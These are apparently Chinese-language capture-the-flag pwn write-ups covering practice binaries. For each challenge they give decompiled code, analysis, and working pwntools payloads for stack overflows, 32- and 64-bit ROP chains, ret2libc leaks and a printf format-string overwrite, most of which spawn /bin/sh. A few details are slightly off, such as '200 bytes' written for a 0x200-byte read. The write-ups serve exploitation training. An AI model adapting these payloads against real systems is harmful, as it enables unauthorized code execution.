## others_shellcode

```c
int getShell()
{
  int result; // eax
  char v1[9]; // [esp-Ch] [ebp-Ch] BYREF

  strcpy(v1, "/bin//sh");
  result = 11;
  __asm { int     80h; LINUX - sys_execve }
  return result;
}
```

本题没有payload，直接`io.interactive()`即可了。显然`getShell()`进行了我看不懂但我大受震撼的调用，所以有必要详细记录一下

### `execve()`函数

头文件：`#include <unistd.h>`

函数声明：`int execve(const char *filename, char *const argv[], char *const envp[]);`

函数说明：
- 参数1：可执行的文件路径；
- 参数2：C风格字符串的数组，代表执行时的参数，第一个元素必须为文件名，数组内以NULL结束；
- 参数3：可以为NULL，传递给执行文件的新环境变量数组，数组内以NULL结束；

函数行为（x86）：
- eax存放execve的系统调用号11
- ebx，ecx，edx依次存放参数1，2，3；
- 执行int 0x80，即系统中断

`#include <unistd.h>`这个头文件是类Unix才有的，所以这个函数不是C标准的；在类Unix系统上，C标准提供了`system()`函数，实际上是对`execve()`函数的封装：`system('/bin/sh')  ==>  execve("/bin/sh", {"sh", NULL}, NULL)  ==>  执行系统中断，调用号11`

### 分析

本题直接F5看上去会很懵，还是要看看汇编

```x86asm
public getShell
getShell proc near
; __unwind {
push    ebp
mov     ebp, esp
call    __x86_get_pc_thunk_ax
add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)
xor     edx, edx        ; envp
push    edx
push    68732F2Fh
push    6E69622Fh
mov     ebx, esp        ; file
push    edx
push    ebx
mov     ecx, esp        ; argv
mov     eax, 0FFFFFFFFh
sub     eax, 0FFFFFFF4h
int     80h             ; LINUX - sys_execve
nop
pop     ebp
retn
; } // starts at 550
```

化简一下，应该一目了然了

```c
int getShell()
{
  int result;                   // eax
  char v1[9];                   // [esp-Ch] [ebp-Ch] BYREF

  strcpy(v1, "/bin//sh");

  mov ebx, esp                  // file = v1
  push ebx; mov ecx, esp        // argv = file
  xor edx, edx                  // envp = NULL
  result = 11;                  // mov eax, 11

  __asm { int     80h; LINUX - sys_execve }
  return result;
}
```

## ciscn_2019_ne_5

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  //...
  char src[4]; // [esp+4h] [ebp-FCh] BYREF
  //...
  char s1[4]; // [esp+84h] [ebp-7Ch] BYREF
  //...
  __isoc99_scanf("%100s", s1);
  if ( strcmp(s1, "administrator") )
  {
    puts("Password Error!");
    exit(0);
  }
  //...
  switch ( v4 )
  {
    case 1:
      AddLog(src);
      result = sub_804892B(argc, argv, envp);
      break;
    //...
    case 3:
      Print();
      result = sub_804892B(argc, argv, envp);
      break;
    case 4:
      GetFlag(src);
      result = sub_804892B(argc, argv, envp);
      break;
  }
  return result;
}

int __cdecl AddLog(int a1)
{
  printf("Please input new log info:");
  return __isoc99_scanf("%128s", a1);
}

int Print()
{
  return system("echo Printing......");
}

int __cdecl GetFlag(char *src)
{
  char dest[4]; // [esp+0h] [ebp-48h] BYREF
  char v3[60]; // [esp+4h] [ebp-44h] BYREF

  *(_DWORD *)dest = 48;
  memset(v3, 0, sizeof(v3));
  strcpy(dest, src);
  return printf("The flag is your log:%s\n", dest);
}
```

`main()`函数里的字符串几乎都能溢出；但是能用的只有`src`一个，并且对它的输入在`AddLog()`函数里；并且由于`main()`是个死循环，而`AddLog()`本身没有可以利用的地方，就只能在`GetFlag()`里通过`strcpy()`利用了。

函数窗口中可见`system()`（0x80484d0），但是没有`"/bin/sh"`；本题有多种做法的，先看一下标准做法

### 标准做法

String view中有`LOAD:080482E6	00000007	C	fflush`，这是一个字符串，并且它的字串中有`"sh"`（0x80482e6+4），

那么就是简单的32位rop了，`payload = b'a'*0x(48+4) + p32(0x80484d0) + p32(0x80482ea)`

### 我的初始做法

既然往事俱备，只欠`"/bin/sh"`，而`"/bin/sh"`又是一个字符串，那应该可以通过标准输入的方式。但是缺点是这种方式需要获取字符串缓冲区的指针来作为`system()`的参数，在没有`printf()`漏洞的情况下、以我目前的能力做不到这一点；但是既然是作为参数，那如果这个指针是另一个函数的参数呢？在32位rop中，参数是不会被弹掉的，而`GetFlag(char *src)`恰好有一个满足条件的参数。

但仅仅有参数还不够，32位rop中也比正常调用少了一步`push eip`（`call fun := push eip; jmp fun`，`ret := pop edx; jmp edx`），这会导致`GetFlag(char *src)`的参数被当成`system()`函数的返回地址；恰好在`Print()`中有`call _system`指令，这就满足条件了。

但最终这个方法没有打通。原因在于`gets()`函数，这个函数会给输入的字符串补上NULL，导致指针参数的值不可避免地被修改了。

## 铁人三项(第五赛区)_2018_rop

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+10h] [ebp-88h] BYREF

  return read(0, buf, 0x100u);
}
```

简单32位rop，没有`system("/bin/sh")`，需要泄露libc

```python
payload_a = b'a'*0x8c + p32(elf.plt['write']) + p32(elf.symbols['vulnerable_function']) + p32(1) + p32(elf.got['write']) + p32(4)
payload_b = b'a'*0x8c + p32(system) + p32(0) + p32(bin_sh)
```

## bjdctf_2020_babyrop

[铁人三项(第五赛区)_2018_rop](#铁人三项(第五赛区)_2018_rop)的64位版

```python
pop_rdi_ret = next(elf.search(asm('pop rdi\nret')))
payload_a = b'a'*0x28 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['vuln'])
payload_b = b'a'*0x28 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
```

## bjdctf_2020_babystack

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF
  //...
  __isoc99_scanf("%d", &nbytes);
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```

简单`gets()`缓冲区溢出，并且有`backdoor()`函数（0x4006e6）调用`system("/bin/sh")`

`io.sendlines([b'10086', b'a'*0x18 + p64(0x4006e6)])`

## not_the_same_3dsctf_2016

比[bjdctf_2020_babystack](#bjdctf_2020_babystack)稍微复杂一点的简单题，

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF

  printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ");
  gets(v4);
  return 0;
}

int get_secret()
{
  int v0; // esi

  v0 = fopen("flag.txt", &unk_80CF91B);
  fgets(&fl4g, 45, v0);
  return fclose(v0);
}
```

通过String view找到`flag`然后跳转引用到`get_secret()`函数（0x80489a0），此函数将flag内容输出到`&fl4g`（0x80eca2d），所以需要用一个输出函数打印它（一般用`write()`，因为它打印的结束条件只有长度这一参数）；Functions window中搜索有`write()`（0x806e270）

注意这里的`main()`函数开头是没有`push ebp`的，故不需要覆盖ebp

故payload = get_secret（溢出返回） + write（get_secret返回） + 任意（无所谓返回）+ 0 + 1（stdout） + &fl4g + 45（`write(stdout, &fl4g, 45)`）

```python
payload = b'a'*0x2d + p32(0x80489a0) + p32(0x806e270) + p32(0) + p32(1) + p32(0x80eca2d) + p32(45)
```

## [HarekazeCTF2019]baby_rop

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  system("echo -n \"What's your name? \"");
  __isoc99_scanf("%s", v4);
  printf("Welcome to the Pwn World, %s!\n", v4);
  return 0;
}
```

简单64位栈溢出；`system()`函数（0x400490）和`"/bin/sh"`（0x601048）都有，注意 64位程序使用寄存器传参，所以需要把栈上参数弹到寄存器上，然后再调用目标函数，也就是`pop rdi; ret`；这条指令据说是有万能地址的（normal/#ciscn_2019_c_1 中是0x400c83，而本题是0x400683，或者使用`next(elf_file.search(asm('pop rdi\nret')))`）

payload = b'a'*0x18 + p64(0x400683) + p64(0x601048) + p64(0x400490)

## jarvisoj_level2_x64

和[\[HarekazeCTF2019\]baby_rop](#[HarekazeCTF2019]baby_rop)没有多大区别，不赘述

```python
pop_rip_ret = next(elf_file.search(asm('pop rdi\nret')))
payload = b'a'*0x88 + p64(pop_rip_ret) + p64(0x600a90) + p64(elf.plt['system'])
```

## warmup_csaw_2016

危险函数`gets`，缓冲区距离栈顶`0x40`字节

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[64]; // [rsp+0h] [rbp-80h] BYREF
  char v5[64]; // [rsp+40h] [rbp-40h] BYREF

  write(1, "-Warm Up-\n", 0xAuLL);
  write(1, "WOW:", 4uLL);
  sprintf(s, "%p\n", sub_40060D);
  write(1, s, 9uLL);
  write(1, ">", 1uLL);
  return gets(v5);
}
```

程序会打印出函数`sub_40060D`的地址，此函数调用了`system('/bin/sh')`

由于是64位程序，rbp大小为8，故`payload = 'a' * 0x48 + sub_addr`

## ciscn_2019_n_1

危险函数`gets`，利用它通过覆盖掉`v2`的值；`v1`与`v2`距离为`0x2c`，`11.28125`的二进制表示是`0x41348000`
故`payload = 'a' * 0x2c + p64(0x41348000)`

```c
int func()
{
  int result; // eax
  char v1[44]; // [rsp+0h] [rbp-30h] BYREF
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(v1);
  if ( v2 == 11.28125 )
    result = system("cat /flag");
  else
    result = puts("Its value should be 11.28125");
  return result;
}
```

## ciscn_2019_n_8

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  //...
  puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5);
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] == 17LL )
      system("/bin/sh");
  }
  //...
}
```

只需要使得`int64_t(var[13:21])`的值为17即可；考虑字节序即`var[13]=17, var[14:21]=0`

`payload = p32(17)*14 + p32(0)*7`

## jarvisoj_level0

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  return read(0, buf, 0x200uLL);
}
```

buf距离rbp为0x80=128字节，read写入200字节，缓冲区溢出；rbp大小为8；callsystem函数地址为0x400596

```
payload = b'a'*136 + p64(0x400596)
```

## jarvisoj_level2

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF

  system("echo Input:");
  return read(0, buf, 0x100u);
}
```

明显的缓冲区溢出，无直接调用`system("/bin/sh")`但有`system()`函数地址0x0804a020，String view看到`"/bin/sh"`的地址0x0804a024，构造32位rop

`payload = b'a'*(0x88+4) + p32(0x8048320) + b'c'*4 + p32(0x0804a024)`

## get_started_3dsctf_2016

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[56]; // [esp+4h] [ebp-38h] BYREF

  printf("Qual a palavrinha magica? ", v4[0]);
  gets(v4);
  return 0;
}
```

`gets()`缓冲区溢出，通过String view看到`"flag.txt"`，Jump to xref to operand，发现了一个`get_flag(a1, a2)`函数（0x80489a0）输出文件的内容

```c
void __cdecl get_flag(int a1, int a2)
{
  //...
  if ( a1 == 0x308CD64F && a2 == 0x195719D1 )
  {
    // Print file flag.txt
    //...
  }
}
```

构造32位rop，`get_flag(814536271, 425138641)`即可

注意：1.本题中的函数调用开头没有`push ebp`（这是编译器偏好决定的，只要栈的信息能够保存就可以了），故不用覆盖；2.`get_flag()`函数输出时不会清空`stdout`的缓冲区，需要正常退出，即返回到`exit()`（0x804e6a0）才能看到输出

`payload = b'a'*0x38 + p32(0x80489a0) + p32(0x804e6a0) + p32(0x308CD64F) + p32(0x195719D1)`

## pwn1_sctf_2016

```c
  // vuln()
  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF

  printf("Tell me something about yourself: ");
  fgets(s, 32, edata);
  // ...
  v0 = (const char *)std::string::c_str((std::string *)&input);
  strcpy(s, v0);
```

`IDA`可以看到`fgets`函数，危险的`strcpy`函数；但本题使用IDA会得到奇奇怪怪的代码，故使用gdb动态调试

```
stack 0xffffd214 —▸ 0x804b0ac (input) —▸ 0x80513dc ◂— 'IIIIII\n'
seg   0x8049257 <vuln+168>    call   replace                     <replace>
stack 0xffffd214 —▸ 0x804b0ac (input) —▸ 0x805151c ◂— 'youyouyouyouyouyou\n'
```

`replace`函数将输入字符串中的`"I"`替换为`"you"`，导致字符串变长进而可能在`strcpy`处溢出。

函数窗口中可见`get_flag`函数，地址为0x8048f0d

`s`距离`ebp`为0x3c字节，`ebp`为4字节，垃圾数据总量为 0x3c + 4 = 64字节，64 = 3*21+1

`payload = b'I'*21 + b'a' + p32(0x8048f0d)`

## [第五空间2019 决赛]PWN5

```c
int __cdecl main(int a1)
{
  //...
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  //...
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  // ...
}
```

[printf格式化字符串漏洞原理解析](https://blog.csdn.net/liucc09/article/details/110142208)

`nptr`和地址`dword_804C044`比较，通过`printf`漏洞改写0x804C044的值即可

```
your name:abcd%10$x
Hello,abcd64636261
```

使用`abcd%N$x`重复输入测试得偏移量N为10，直接用pwntools构造`fmtstr_payload(10,{0x0804C044: 0x12345678})`

```python
sh.sendline(fmtstr_payload(10,{0x0804C044: 0x12345678}))
sh.sendline(str(0x12345678).encode('ascii'))
```

## rip

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[15]; // [rsp+1h] [rbp-Fh] BYREF

  puts("please input");
  gets(s, argv);
  puts(s);
  puts("ok,bye!!!");
  return 0;
}
```

危险函数`gets`，缓冲区距离栈顶`0xF`字节

通过Strings view找到`"/bin/sh"`，被`fun`函数引用；函数地址为`0x401186`

```c
int fun()
{
  return system("/bin/sh");
}
```

### 方法1

由于是64位程序，`rbp`大小为`8`，故`payload = b'a' * (0xf+8) + p64(0x401186)` 但攻击失败。搜索了下是栈对其问题

参考：[在一些64位的glibc的payload调用system函数失败问题](http://blog.eonew.cn/archives/958)

```python
payload = b'a' * (0xf) + p64(0x401187)
```

### 方法2

Edit ==> functions ==> Stack variable 查看栈视图，发现返回地址在`s+0xF`处

```x86asm
-000000000000000F s               db ?
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004                 db ? ; undefined
-0000000000000003                 db ? ; undefined
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
```

```python
payload = b'a' * (0xf) + p64(0x401186)
```
